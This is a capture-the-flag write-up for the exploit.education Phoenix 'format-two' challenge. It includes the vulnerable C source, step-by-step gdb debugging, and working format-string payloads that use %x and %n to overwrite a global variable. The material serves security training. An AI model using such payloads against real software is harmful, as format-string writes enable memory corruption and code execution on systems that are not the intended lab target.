# Phoenix format-two
https://exploit.education/phoenix/format-two/
### Result
```
gef➤  run $(python -c 'print "\x30\xa0\x04\x08" + "%x" * 14 + "%n"')
0f7feade0ffffd65cf7e781890f7fc0000ffffd668804857dffffd55cffffd840100ffffd704ffffd5a4ffffd5a03

Well done, the 'changeme' variable has been changed correctly!
Canary at: 96	:0x804a030
```
### Setup
```
docker start ctf
docker container exec -it ctf bash
```
### Compile code
This is a `format string` challenge using `printf`.  Unlike the **format_one** and **format_zero** challenges:
 - The value to overwrite is not a local variable on the `stack`.
 - Input is provided via `argv[1]`.

```
int changeme;               <-- defined at the "file" level so available inside main() and bounce()

void bounce(char *str) {
      printf(str);          <-- here is the Format String issue.
}

int main(int argc, char **argv) {
  char buf[256];

```
### The Format String exploit
Different to the first two format string challenges, you pass in the payload as `argv[1]`.

Both challenges so far had the `changeme` on the `stack`.  The `changeme` was conveniently located next to the `destination buffer`.  Overflow the buffer and you would write over the `changeme` variable.  We could inject `format arguments` to try and take the `buffer` beyond `256` characters, using our user input ( which routes the input via `strncpy` ).  Alas, this would not help with this challenge.

What `Format String operator` lets you write an integer to the address of a variable ?  

Parameter  | Meaning  | Passed as
--|---|--
%d   | decimal (int)  |  value
%u   | unsigned decimal (unsigned int)  |  value
%x| hexadecimal (unsigned int)  |  value
%n| number of bytes written so far (*int) |  reference
%hn| number of bytes written so far (*short) |  reference  
%s | string ((const) (unsigned) char*)  |  reference

##### The %n Parameter
The `%n` or `%hn`.  In this instance we were dealing with an `int` so we use the `%n` to write an integer to nearly any location in `process memory`.  Example code below:

```
int main() {
    int medium_num;
    short tiny_num;
    printf("AAAAAAAAA%n", &medium_num);    // copies 0x9 into the memory address of 'medium_num'
    printf("BBBB%hn", &tiny_num);          // copies 0x4 into the memory address of 'tiny_num'
    return 0;
}
```
### Finding the changeme variable ( 32 bit application )
##### Get target variable's address
`objdump -t format-two-32b | grep changeme  # 0804a030`
##### Re-order bytes for Little Endian
`\x30\xa0\x04\x08`
### Find printf starting argument
The `format string` is also placed on the `stack`.  Visually I liked the following diagram:

Top of stack | | printf pointer    |   |   | <-- grows  |  Bottom of stack
--|---|---|---|---|---|--
  | Return Addr  | Addr of format string   | var one  | var two  |   |  


With brute force you can find the first argument passed to `printf`.

`run $(python -c 'print "AAAA" + "%x." * 12')`

Keep incrementing the `%x` until you hit the number you see `41414141`:

`AAAA0000000b.00000000.ffffe510.00000000.3830252e.00000000.ffffe410.ffffe510.004006a1.ffffe5f8.ffffe550.41414141.Better luck next time!`

##### Offset I want at 15
`./format-two-32b 'AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x'`
##### Get a Segmentation fault when adding %n
`./format-two-32b 'AAAA%x %x %x %x %x %x %x %x %x %x %x %x %x %x %n'`
##### Run in gdb
`gef➤  r 'AAAA%x %x %x %x %x %x %x %x %x %x %x %x %x %x %n'`
##### Segmentation fault
` → 0xf7e332c9 <vfprintf+9113>  mov    DWORD PTR [eax], edi`
##### Root cause
The program was trying to write into the address stored in the `eax` register. Good news, that was the `AAAA` that was passed in as a argument one ( `argv[1]` )
`$eax   : 0x41414141 ("AAAA")`
##### Re-run with changeme targeted
`gef➤  r '\x30\xa0\x04\x08 %x %x %x %x %x %x %x %x %x %x %x %x %x %x %n'`
##### Segmentation fault
`$eax   : 0x3033785c`
##### Remove whitespace
`r 'AAAA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n'`
##### Remove whitespace
`r '\x30\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n'`
##### Segmentation fault
What caused the appearance of these bytes?
`$eax   : 0x3033785c`
### Test the attack -> understand the bytes inside the buffer
##### Fill stack
`gef➤  run $(python -c 'print "A"*256')`
##### Inspect the code
This challenge uses more C APIs than previous `format string` challenges.
```
radare2 -A format_two

[0x00400520]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004004d0 GLOBAL FUNC       strncpy
2   0x004004e0 GLOBAL FUNC       puts
3   0x004004f0 GLOBAL FUNC       printf
4   0x00400500 GLOBAL FUNC       memset
7   0x00400510 GLOBAL FUNC       exit
```
We can set breakpoints on each API to find / verify the target buffer, buffer length and what is happening at a byte level in memory.
##### Set four breakpoints
```
Breakpoint order:
      memset
      strncpy
      printf
      if changeme != 0  ( in assembler this is a TEST (32 bit ) or CMP ( 64 bit) mnemonic >
```
##### BONUS - compiler flag help
If you get to compile with the `gcc -g` flag, gdb instantly prints all parameters passed into a `C API`.  Speeds up debugging!

##### Breakpoint 1 - get address and length of Buffer from memset
```
memset@plt (
   [sp + 0x0] = 0xffffd47c → 0x00000000,
   [sp + 0x4] = 0x00000000,
   [sp + 0x8] = 0x00000100,		< 256 bytes
)
```
##### Breakpoint 2 - strncpy() check buffer is empty before copy
```
gef➤  x/256bx 0xffffd47c
0xffffd47c:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
...
0xffffd574:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```
##### Breakpoint 3 - printf() - check buffer is full of A's
```
gef➤  x/256bx 0xffffd47c
0xffffd47c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
...
0xffffd574:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
```
##### Breakpoint 4- test / cmp mnemonic ( changeme != 0)
```
gef➤  x/256bx 0xffffd47c
0xffffd47c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
...
0xffffd574:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
```
### Run the attack
##### Fill stack
`r '\x30\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n'`

##### Breakpoint 1 - get address and length of Buffer from memset
```
memset@plt (
   [sp + 0x0] = 0xffffd54c
)
```
##### Breakpoint 2 - strncpy() check buffer is empty before copy
`gef➤  x/256bx 0xffffd54c   # empty as expected`
##### Breakpoint 3 - printf() - check contents of buffer
```
gef➤  x/256bx 0xffffd54c
0xffffd54c:	0x5c	0x78	0x33	0x30	0x5c	0x78	0x61	0x30
0xffffd554:	0x5c	0x78	0x30	0x34	0x5c	0x78	0x30	0x38
0xffffd55c:	0x25	0x78	0x25	0x78	0x25	0x78	0x25	0x78
0xffffd564:	0x25	0x78	0x25	0x78	0x25	0x78	0x25	0x78
0xffffd56c:	0x25	0x78	0x25	0x78	0x25	0x78	0x25	0x78
0xffffd574:	0x25	0x78	0x25	0x78	0x25	0x6e	0x00	0x00
...
0xffffd644:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```
##### Breakpoint 4- test / cmp mnemonic ( changeme != 0)
`< does not get this far. Segmentation fault: $eax   : 0x3033785c >`

The target address was NOT getting written to the stack. Instead, the first bytes are `0x5c	0x78	0x33	0x30` or `0x3033785c`.  

What happened to our bytes ( `\x30\xa0\x04\x08` ) ?
### Debugging the bytes in memory: Part 1
Let's use gdb to read the `argv[1]` to see if this is a problem of passing values into the command line.
##### Run
`gef➤  r '\x30\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n`
##### Breakpoint 1 - memset
Now you can check `argv[1]`
##### Get memory address
```
gef➤  print &argv[1]
$1 = (char **) 0xffffd6f8
```
##### Get value passed into argv[1]
```
gef➤  print argv[1]
$2 = 0xffffd834 "\\x30\\xa0\\x04\\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n"
```
##### Result
So the problem is with the ` r '\x30\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n` statement.  It is filling `argv[1]` with rubbish.
```
gef➤  x/4bx 0xffffd834
0xffffd834:	0x5c	0x78	0x33	0x30
```
### Debugging the bytes in memory: Part 2
##### Refined payload
`run $(echo -n "\x30\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n")`
##### Get value passed into argv[1]
```
gef➤  print argv[1]
$4 = 0xffffd82e "-e"
```
##### Analysis of echo
Something in this `echo` statement is passing nonsense into `argv[1]`.
### Debugging the bytes in memory: Part 3
##### Pass arguments with Python
`run $(python -c 'print "\x30\xa0\x04\x08" + "%x" * 14 + "n"')`
##### That worked!
```
gef➤  print argv[1]
$6 = 0xffffd841 "0\240\004\b%x%x%x%x%x%x%x%x%x%x%x%x%x%xn"
gef➤  x/8bx 0xffffd841
0xffffd841:	0x30	0xa0	0x04	0x08

gef➤  c
Continuing.
0f7feade0ffffd65cf7e781890f7fc0000ffffd668804857dffffd55cffffd840100ffffd704ffffd5a4ffffd5a03Well done, the 'changeme' variable has been changed correctly!
Canary at: 96	:0x804a030
```
### Alternative
##### Prepare input outside of debugger ( and reverse bytes )
`python -c 'print "\x08\x04\xa0\x30"[::-1] + "%p"*14 + "%n"' > change_me_bytes.hex`
##### Check the bytes
```
# xxd change_me_bytes.hex
00000000: 30a0 0408 2570 2570 2570 2570 2570 2570  0...%p%p%p%p%p%p
00000010: 2570 2570 2570 2570 2570 2570 2570 2570  %p%p%p%p%p%p%p%p
00000020: 256e 0a                                  %n.
```
##### Inside of gdb
```
run $(cat change_me_bytes.hex)
00xf7feade00xffffd65c0xf7e78189(nil)0xf7fc00000xffffd6680x804857d0xffffd55c0xffffd8400x1000xffffd7040xffffd5a40xffffd5a00x3
Well done, the 'changeme' variable has been changed correctly!
Canary at: 126	:0x804a030
```
##### Outside of gdb
```
# ./format-two-32b $(cat change_me_bytes.hex )
Welcome to brought to you by https://exploit.education
00xf7f6bde00xffc9729c0xf7df9189(nil)0xf7f410000xffc972a80x804857d0xffc9719c0xffc988540x1000xffc973440xffc971e40xffc971e00x3
Well done, the 'changeme' variable has been changed correctly!
Canary at: 126	:0x804a030
```


### Source code
```
 /*
 * Can you change the "changeme" variable?
 */

 #include <err.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>

 #define BANNER \
   "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

 int changeme;

 void bounce(char *str) {
   printf(str);
 }

 int main(int argc, char **argv) {
   char buf[256];

   printf("%s\n", BANNER);

   if (argc > 1) {
     memset(buf, 0, sizeof(buf));
     strncpy(buf, argv[1], sizeof(buf));
     bounce(buf);
   }

   if (changeme != 0) {
     puts("Well done, the 'changeme' variable has been changed correctly!");
   } else {
     puts("Better luck next time!\n");
   }

   exit(0);
 }
```

### References

http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf

https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

https://blog.lamarranet.com/index.php/exploit-education-phoenix-format-two-solution/
